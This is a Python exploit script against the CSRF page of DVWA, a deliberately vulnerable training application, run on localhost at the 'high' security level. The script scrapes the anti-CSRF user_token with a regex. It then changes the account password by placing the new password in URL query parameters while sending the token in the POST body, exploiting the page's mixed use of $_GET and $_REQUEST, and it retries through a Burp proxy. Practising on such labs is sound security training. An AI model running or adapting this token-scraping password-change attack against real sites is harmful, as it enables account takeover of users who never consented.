#     _________.__            __           ___________.__                   .___
#    /   _____/|  |__   _____/  |_  ______ \_   _____/|__|______   ____   __| _/
#     \_____  \ |  |  \ /  _ \   __\/  ___/  |    __)  |  \_  __ \_/ __ \ / __ | 
#     /        \|   Y  (  <_> )  |  \___ \   |     \   |  ||  | \/\  ___// /_/ | 
#    /_______  /|___|  /\____/|__| /____  >  \___  /   |__||__|    \___  >____ | 
#            \/      \/                 \/       \/                    \/     \/ 

import requests
import re
import time
import warnings

# Suppress only the single InsecureRequestWarning from verify=False
# from requests.packages.urllib3.exceptions import InsecureRequestWarning
# warnings.simplefilter('ignore', InsecureRequestWarning)
try:
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    print("[!] Disabled InsecureRequestWarning for requests (verify=False used).")
except AttributeError:
    print("[!] Could not disable InsecureRequestWarning (maybe older requests version?).")


# --- Configuration ---
TARGET_URL = 'http://127.0.0.1/dvwa/vulnerabilities/csrf/' # Adjust if needed
# ⚠️ CRITICAL: Use the SAME valid PHPSESSID as before
SESSION_COOKIE = 'YOUR_PHPSESSID_GOES_HERE' # <--- PASTE YOUR COOKIE VALUE HERE

NEW_PASSWORD = 'Password123!' # Choose a new password
MAX_RETRIES = 5
RETRY_DELAY_SECONDS = 1

# --- Burp Suite Proxy Setup ---
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

# --- Session and Headers ---
session = requests.Session()
session.cookies.set('PHPSESSID', SESSION_COOKIE)
session.cookies.set('security', 'high')
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Referer': TARGET_URL # Keep the base URL as referer
}

# --- fetch_csrf_token function ---
def fetch_csrf_token():
    """Fetches a fresh CSRF token from the target page."""
    print("[*] Attempting to fetch a fresh CSRF token...")
    try:
        response = session.get(
            TARGET_URL, headers=headers, proxies=proxies, verify=False, timeout=10
        )
        response.raise_for_status()
        if "login.php" in response.url or "Login :: Damn Vulnerable Web Application" in response.text:
            print("[-] Session invalid or expired. Redirected to login page.")
            print("[-] Please update the SESSION_COOKIE variable with a fresh PHPSESSID.")
            return None
        match = re.search(r'name=[\'"]user_token[\'"]\s*value=[\'"]([a-f0-9]{32})[\'"]', response.text, re.IGNORECASE)
        if match:
            token = match.group(1)
            print(f"[+] CSRF Token Retrieved: {token}")
            return token
        else:
            print("[-] Could not find CSRF token ('user_token') on the page.")
            print("[-] Page content sample (first 500 chars):")
            print(response.text[:500])
            return None
    except requests.exceptions.Timeout:
        print(f"[-] Timeout error while fetching token.")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[-] Network or HTTP error while fetching token: {e}")
        return None


# --- MODIFIED submit function ---
def submit_password_change_exploiting_get(token):
    """Submits the password change exploiting the PHP's use of $_GET
       by sending passwords in URL params, but token in POST body."""

    print(f"[*] Submitting password change exploiting GET params with token: {token}")

    # Prepare URL with GET parameters (URL-encode password if it contains special chars, though requests might handle basic cases)
    # For simplicity here, assuming NEW_PASSWORD doesn't need complex encoding. Use urllib.parse.urlencode if needed.
    target_url_with_get_params = f"{TARGET_URL}?password_new={NEW_PASSWORD}&password_conf={NEW_PASSWORD}&Change=Change"
    print(f"[*] Target URL for POST: {target_url_with_get_params}")

    # Prepare POST body *only* with the token.
    # The PHP uses $_REQUEST['user_token'], which reads POST data if it's not in GET.
    post_payload = {
        'user_token': token
    }
    # We could potentially add other fields to POST body too, but they'd likely be ignored by the specific PHP code shown.
    # Keeping it minimal ensures we rely on the token being read via $_REQUEST from the POST body.

    try:
        # Make the POST request to the URL that includes GET params
        response = session.post(
            target_url_with_get_params, # URL now has GET params
            headers=headers,
            data=post_payload,          # POST body contains ONLY token (and maybe ignored fields)
            proxies=proxies,
            verify=False,
            timeout=10
        )
        response.raise_for_status()
        response_text = response.text

        # Check response content
        if "Password Changed." in response_text:
            print(f"[+] SUCCESS: Password successfully changed to '{NEW_PASSWORD}'!")
            return True
        elif "Passwords did not match." in response_text:
             print("[-] FAILURE: Server reported passwords did not match. Check GET parameters encoding or logic.")
             return False
        elif re.search(r"CSRF token is incorrect|invalid.+token", response_text, re.IGNORECASE):
             print("[-] FAILURE: Server reported CSRF token is incorrect or invalid.")
             return False
        elif "login.php" in response.url or "Login :: Damn Vulnerable Web Application" in response_text:
             print("[-] FAILURE: Ended up on login page after POST. Session might have expired.")
             return False
        else:
            print("[-] FAILURE: Password change failed. Unexpected response.")
            print("[-] Response snippet (first 500 chars):")
            print(response_text[:500])
            return False

    except requests.exceptions.Timeout:
        print(f"[-] Timeout error during password change submission.")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Network or HTTP error during password change submission: {e}")
        return False

# --- main function remains largely the same, just calls the new submit function ---
def main():
    print("--- Starting DVWA High CSRF Password Change Attempt (Exploiting GET Params) ---")

    if 'YOUR_PHPSESSID_GOES_HERE' in SESSION_COOKIE:
        print("❌ ERROR: You MUST update the 'SESSION_COOKIE' variable in the script!")
        return

    attempt = 0
    success = False
    last_fetch_error_type = None

    while attempt < MAX_RETRIES and not success:
        print(f"\n--- Attempt {attempt + 1} of {MAX_RETRIES} ---")
        csrf_token = fetch_csrf_token()
        if csrf_token is None:
            print("[-] Failed to fetch token.")
            if attempt > 0 and last_fetch_error_type == "fetch_fail":
                 print("[-] Consecutive token fetch failures. Aborting - check session cookie validity.")
                 break
            last_fetch_error_type = "fetch_fail"
            attempt += 1
            time.sleep(RETRY_DELAY_SECONDS)
            continue
        else:
            last_fetch_error_type = None

        # *** Use the modified submission function ***
        success = submit_password_change_exploiting_get(csrf_token)

        if not success:
            attempt += 1
            if attempt < MAX_RETRIES:
                print(f"[*] Waiting {RETRY_DELAY_SECONDS} second(s) before retrying...")
                time.sleep(RETRY_DELAY_SECONDS)

    # --- Final Result ---
    print("\n--- Script Finished ---")
    if success:
        print("✅ Password change exploiting GET parameters was successful.")
    else:
        print(f"❌ Password change exploiting GET parameters failed after {MAX_RETRIES} attempts.")
        print("   Review logs above for specific errors (CSRF token, session, network, etc.).")
        print("   Check Burp history for the exact request/response details.")

if __name__ == "__main__":
    main()
